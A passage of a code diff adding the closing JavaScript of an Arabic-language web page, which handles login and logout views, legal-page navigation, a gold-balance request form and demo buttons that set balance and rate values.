+    document.getElementById("waiting-cancel-btn").addEventListener("click", () => {
+      stopApprovalPolling();
+      state.awaiting = null;
+      clearNotice();
+      showView("login");
+    });
+
+    document.getElementById("profile-logout-btn").addEventListener("click", () => {
+      state.pendingAuth = null;
+      clearNotice();
+      showView("login");
+    });
+
+    document.getElementById("request-form").addEventListener("submit", (e) => {
+      e.preventDefault();
+      if (!state.account) { showView("login"); return; }
+      if (state.gold < state.rate) {
+        showNotice("تحتاج إلى " + state.rate + " ذهب على الأقل.", "error");
+        return;
+      }
+      const rid = state.nextRequestId++;
+      showNotice("تم تسجيل الطلب رقم #" + rid + ".", "success");
+    });
+
+    document.getElementById("logout-btn").addEventListener("click", () => {
+      stopApprovalPolling();
+      state.account = null;
+      state.pendingAuth = null;
+      state.awaiting = null;
+      clearNotice();
+      showView("login");
+    });
+
+    document.getElementById("brand-link").addEventListener("click", () => {
+      clearNotice();
+      showView(getActiveAuthView());
+    });
+
+    document.getElementById("nav-privacy").addEventListener("click", () => {
+      clearNotice();
+      document.getElementById("legal-title").textContent = "سياسة الخصوصية";
+      showView("legal");
+    });
+    document.getElementById("nav-terms").addEventListener("click", () => {
+      clearNotice();
+      document.getElementById("legal-title").textContent = "شروط الاستخدام";
+      showView("legal");
+    });
+    document.getElementById("legal-back").addEventListener("click", () => {
+      clearNotice();
+      showView(getActiveAuthView());
+    });
+
+    document.getElementById("demo-gold-5500").addEventListener("click", () => { state.gold = 5500; renderDashboard(); });
+    document.getElementById("demo-gold-add").addEventListener("click", () => { state.gold += 1000; renderDashboard(); });
+    document.getElementById("demo-rate-1200").addEventListener("click", () => { state.rate = 1200; renderDashboard(); });
+    document.getElementById("demo-rate-1000").addEventListener("click", () => { state.rate = 1000; renderDashboard(); });
+  </script>
+</body>
+</html>
